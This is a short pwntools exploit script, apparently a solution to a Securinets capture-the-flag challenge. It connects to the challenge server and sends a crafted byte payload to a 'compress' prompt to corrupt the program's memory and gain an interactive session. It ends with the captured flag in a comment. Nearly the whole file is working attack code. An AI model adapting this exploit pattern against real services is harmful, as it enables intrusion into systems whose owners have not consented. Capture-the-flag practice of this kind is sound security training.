#!/usr/bin/env python3

from pwn import *

exe = ELF('./main')
# libc = ELF('')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
b *0x40130B
'''

p = remote("pwn-14caf623.p1.securinets.tn", 9000)
#p = process('./main')
#p = gdb.debug('./main', gdbscript = script)

payload = b"AB" * (0x318//4)
payload += b"\xa6" * 0x11
sa(b"compress : ", payload)

sa(b"compress : ", b"exit\x00")

p.interactive()
#Securinets{my_zip_doesnt_zip}